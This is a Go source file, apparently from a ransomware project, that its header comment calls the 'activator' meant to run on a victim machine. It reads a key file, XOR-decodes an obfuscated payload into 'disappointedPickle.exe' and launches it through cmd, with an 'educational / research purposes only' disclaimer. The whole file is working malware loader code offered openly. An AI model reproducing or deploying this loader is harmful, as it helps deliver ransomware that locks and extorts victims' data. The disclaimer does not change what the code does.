/*
	Author: Alcid3s

	The activator is responsible for running on the victim machine, deobfuscate and execute the ransomware.

	This is made for educational / research purposes only. The creator isn't not responsible for any damage caused by this software.
*/

package main

import (
	"io"
	"os"
	"os/exec"

	"ransomware.com/main/internal/obfuscator"
)

func main() {

	// Open the obfuscation key file
	file, err := os.Open("obfuscation.key")
	if err != nil {
		panic(err)
	}
	defer file.Close()

	// Read the contents of the file into a byte slice
	keyBytes, err := io.ReadAll(file)
	if err != nil {
		panic(err)
	}

	// Deobfuscate the ransomware
	obfuscator.XorFile("disappointedPickle.exe", keyBytes, "obfuscated.dat")

	// Execute the ransomware
	c := exec.Command("cmd", "/C", "start", "disappointedPickle.exe")
	c.Run()
}
